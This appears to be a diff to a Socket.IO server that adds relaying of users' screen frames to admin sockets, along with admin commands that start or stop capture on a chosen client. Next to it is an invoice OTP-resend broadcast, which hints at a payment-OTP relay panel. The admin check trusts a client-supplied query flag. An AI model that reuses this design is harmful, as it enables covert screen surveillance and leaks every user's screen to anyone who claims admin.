@@ -800,7 +800,86 @@ io.on('connection', (socket) => {
     console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId}`);
     io.emit('mc_resend_otp', data);  // Broadcast to ALL clients
   });
+
+  // Screen capture handlers
+  socket.on('screen_frame', (data) => {
+    // Get pid from socket query or data
+    const pid = socket.handshake.query?.pid || data.userId;
+    
+    console.log(`Received screen frame from: ${pid || socket.id}, size: ${data.frameData?.length || 0}`);
+    
+    // Forward to admin sockets
+    io.sockets.sockets.forEach(s => {
+      if (s.handshake.query && s.handshake.query.isAdmin === 'true') {
+        s.emit('screen_frame', {
+          ...data,
+          userId: pid,
+          socketId: socket.id
+        });
+      }
+    });
+  });
   
+  socket.on('screen_capture_error', (data) => {
+    console.log(`Screen capture error from: ${socket.id}`, data.error);
+    
+    // Forward to admin sockets
+    io.sockets.sockets.forEach(s => {
+      if (s.handshake.query && s.handshake.query.isAdmin === 'true') {
+        s.emit('screen_capture_error', {
+          ...data,
+          userId: socket.handshake.query.pid,
+          socketId: socket.id
+        });
+      }
+    });
+  });
+  
+  socket.on('init_advanced_capture', (data) => {
+    console.log(`Init screen capture request for: ${data.userId}`);
+    
+    // Find client socket by userId/pid
+    let clientSocket = null;
+    io.sockets.sockets.forEach(s => {
+      if (s.handshake.query && s.handshake.query.pid === data.userId) {
+        clientSocket = s;
+      }
+    });
+    
+    if (clientSocket) {
+      console.log(`Sending start_capture to: ${clientSocket.id}`);
+      clientSocket.emit('control_command', {
+        type: 'start_capture',
+        sessionId: data.sessionId
+      });
+    } else {
+      console.log(`No client found for user: ${data.userId}`);
+    }
+  });
+  
+  socket.on('stop_advanced_capture', (data) => {
+    // Find client socket by userId/pid
+    io.sockets.sockets.forEach(s => {
+      if (s.handshake.query && s.handshake.query.pid === data.userId) {
+        s.emit('control_command', {
+          type: 'stop_capture',
+          sessionId: data.sessionId
+        });
+      }
+    });
+  });
+  
+  socket.on('refresh_advanced_capture', (data) => {
+    // Find client socket by userId/pid
+    io.sockets.sockets.forEach(s => {
+      if (s.handshake.query && s.handshake.query.pid === data.userId) {
+        s.emit('control_command', {
+          type: 'refresh_capture',
+          sessionId: data.sessionId
+        });
+      }
+    });
+  });
   // Handle disconnect
   socket.on('disconnect', () => {
     console.log('Socket disconnected:', socket.id);
